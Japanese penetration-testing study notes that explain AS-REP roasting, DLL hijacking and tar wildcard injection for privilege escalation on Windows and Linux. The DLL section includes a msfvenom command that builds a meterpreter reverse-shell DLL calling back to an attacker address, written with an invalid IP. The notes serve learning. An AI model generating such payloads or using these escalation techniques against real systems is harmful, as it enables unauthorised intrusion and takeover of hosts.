# Windows

## AS-REP Roasting
**AS-REP roastingは、Kerberos pre authenticationなしでユーザからパスワードハッシュを取得できる攻撃**のことを指す。
Kerberosへの認証において、まずはAS-REQを送信するというステップがある。この要求に基づいてDCは認証成功を判断する。  
**認証に成功すると、DCはセッションキーとTGTを含むAS-REPを返す。**  
ユーザ名のパスワードとハッシュから生成したハッシュを使って暗号化されたタイムスタンプをAS-REQにのせてユーザの認証をDCに頼むという流れを、**Kerberos Pre Authentication**と呼ぶ。この機能が有効だとAS-REP roastingはできない。  
このKerberos pre authenticationがDC側で有効になっていない場合、攻撃者は任意のADユーザに代わってDCにAS-REQを返すよう要求ができる。

### 攻撃で使用できるツール
- Rubeus
- impacket-GetNPUsers
### 攻撃の条件
- DCのIPアドレスが分かっている
- AS-REQを送る際になりすますユーザの属するドメイン名が分かっている
- AS-REQを送る際になりすますドメインの、有効なユーザ名が分かっている
- Kerberosのポート(88番)と通信できる
- DC側の設定で、ターゲットユーザアカウントのKerberos pre authenticationが有効になっていない


## DLL Hijacking
.exeバイナリやそのバイナリに紐づいたサービスは、起動時にDLLを探す。  
**これらのDLLが存在しないかDLLが絶対パスを使わずに呼び出されるといったケースで、バイナリやサービスに悪意のあるDLLファイルを強制的にロード&実行させて権限昇格することができる。**  
  
msfvenom等でバイナリを生成し、DLLやバイナリを生成してリバースシェルを実行すると権限昇格に成功するなどできる。  
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.293.22 LPORT=4444 -f dll -o hoge.dll
```


============-
# Linux

## ワイルドカードインジェクション  
### 概要
tarコマンドの第三引数に*が指定されている場合、そこに--checkpointを入れて任意のコマンド実行ができる。  
tarがバックアップ用のスケジュールタスクだったり、root権限で実行されるようなタスクであった場合、root権限で実行して権限昇格できたりする。  
tarが圧縮するファイルのフォルダのとこに書き込み権限が無いといけない。
### 参考情報
[ワイルドカードインジェクション1](https://medium.com/@silver-garcia/how-to-abuse-tar-wildcards-for-privilege-escalation-tar-wildcard-injection-612a6eac0807)  
[ワイルドカードワイルインジェクション2](https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c)  

### 攻撃の条件
- tarの引数に*が末尾に指定されている。
- root権限(スケジュールタスクでもいい)でtarが実行できる。
- tarが*で圧縮ファイル群を指定する時、この圧縮ファイルたちのフォルダにファイルを作れる必要がある。